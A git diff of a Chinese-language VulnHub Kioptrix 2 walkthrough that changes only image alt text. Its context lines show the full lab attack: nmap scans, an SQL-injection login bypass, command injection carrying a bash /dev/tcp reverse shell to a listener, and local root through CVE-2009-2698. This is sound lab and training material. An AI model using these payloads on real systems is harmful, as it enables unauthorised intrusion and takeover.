@@ -48,7 +48,7 @@ This is the second release of #2. First release had a bug in it with the web app
 nmap -sP 192.168.141.0/24
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix2/1.png)
+![](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix2/1.png)
 
 排除法,去掉自己、宿主机、网关, `192.168.141.145` 就是目标了
 
@@ -57,7 +57,7 @@ nmap -sP 192.168.141.0/24
 nmap -T5 -A -v -p- 192.168.141.145
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix2/2.png)
+![](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix2/2.png)
 
 开放端口数蛮多的,SSH、http、https、Mysql,还有一个较为少见的 631，运行的 CUPS 服务，CUPS 也有许多漏洞
 
@@ -67,7 +67,7 @@ nmap -T5 -A -v -p- 192.168.141.145
 
 # 中期-漏洞利用
 
-![image](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix2/3.png)
+![](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix2/3.png)
 
 看着就像有 SQL 注入的样子,随便试了下注入就进去了
 ```
@@ -75,14 +75,14 @@ nmap -T5 -A -v -p- 192.168.141.145
 密码 1' or '1'='1
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix2/4.png)
+![](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix2/4.png)
 
 看起来有个命令注入,简单尝试发现没有过滤
 ```
 ;ip a
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix2/5.png)
+![](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix2/5.png)
 
 下面直接回弹 shell，kali 监听
 ```
@@ -98,7 +98,7 @@ nc -lvp 4444
 ;bash -i >& /dev/tcp/192.168.141.134/4444 0>&1
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix2/6.png)
+![](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix2/6.png)
 
 回弹成功,果然没有 nc 程序,下面测试提权
 
@@ -112,7 +112,7 @@ cat /etc/*-release
 uname -a
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix2/7.png)
+![](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix2/7.png)
 
 centos 4.5,可以试试 CVE-2009-2698，https://www.exploit-db.com/exploits/9542
 
@@ -134,6 +134,6 @@ ls
 ./a.out
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix2/8.png)
+![](../../../../../assets/img/安全/实验/VulnHub/Kioptrix/Kioptrix2/8.png)
 
 提权成功,感谢 Kioptrix Team 制作靶机
